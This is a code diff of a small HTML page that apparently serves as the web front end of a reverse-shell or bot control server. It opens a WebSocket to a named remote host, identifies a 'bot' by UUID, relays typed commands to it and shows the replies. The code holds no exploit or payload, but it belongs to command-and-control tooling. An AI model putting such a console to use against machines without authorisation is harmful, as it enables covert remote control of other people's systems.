@@ -5,64 +5,64 @@
 <form name="publish">
     <input type="text" name="message">
     <input type="submit" value="Send">
-  </form>
-  
-  <!-- div with messages -->
-  <div id="messages"></div>
+</form>
 
-<script type="text/javascript" >
-  window.onload = function ws_to_back() {
-    
-    let ws = null
-    const uuid_bot = window.location.pathname.split('/')[4]
-    try {
-         ws = new WebSocket("wss://pa5a.cyberfilou.fr/reverseshell")
-    } catch (exception) {
-        console.error(exception)
-    }
-    
-    ws.onopen = function(event){
-        console.log("[OPEN] Connection established")
-        console.log("Sending to server")
-        ws.send("Hello i'm the front web")
+<!-- div with messages -->
+<div id="messages"></div>
 
-        ws.send(uuid_bot)
-    }
-  
-    document.forms.publish.onsubmit = function() {
-        let outgoingMessage = this.message.value
+<script type="text/javascript">
+    window.onload = function ws_to_back() {
 
-        ws.send(outgoingMessage)
-        return false
-    }
+        let ws = null
 
+        try {
+            const uuid = window.location.pathname.split('/')[4]
+            ws = new WebSocket("wss://pa5a.cyberfilou.fr/rsfront?" + uuid)
+        } catch (exception) {
+            console.error(exception)
+        }
 
+        ws.onopen = function (event) {
 
-    ws.onmessage = function(event) {
-        console.log(`[command] Data received from server: ${event.data}`);
+            console.log("[OPEN] Connection established")
+            console.log("Sending to server")
 
-        let message = event.data
+        }
 
-        let messageElem = document.createElement('div');
-        messageElem.textContent = message;
-        document.getElementById('messages').prepend(messageElem);
-        
-    }
+        document.forms.publish.onsubmit = function () {
+            let outgoingMessage = this.message.value
+
+            ws.send(outgoingMessage)
+            return false
+        }
 
 
-    ws.onclose = function(event) {
-        if(event.wasClean){
-            console.log(`[CLOSE] Connection closed, code=${event.code} reason=${event.reason}`)
-         }
-        else{
-            console.log('[CLOSE] Connection died');
+
+        ws.onmessage = function (event) {
+            console.log(`[command] Data received from server: ${event.data}`);
+
+            let message = event.data
+
+            let messageElem = document.createElement('div');
+            messageElem.textContent = message;
+            document.getElementById('messages').prepend(messageElem);
+
+        }
+
+
+        ws.onclose = function (event) {
+            if (event.wasClean) {
+                console.log(`[CLOSE] Connection closed, code=${event.code} reason=${event.reason}`)
+            }
+            else {
+                console.log('[CLOSE] Connection died');
+            }
+        }
+
+        ws.onerror = function (error) {
+            console.log(`[ERROR] ${error.message}`)
         }
     }
-
-    ws.onerror = function(error) {
-        console.log(`[ERROR] ${error.message}`)
-    }
-}
 
 </script>
 
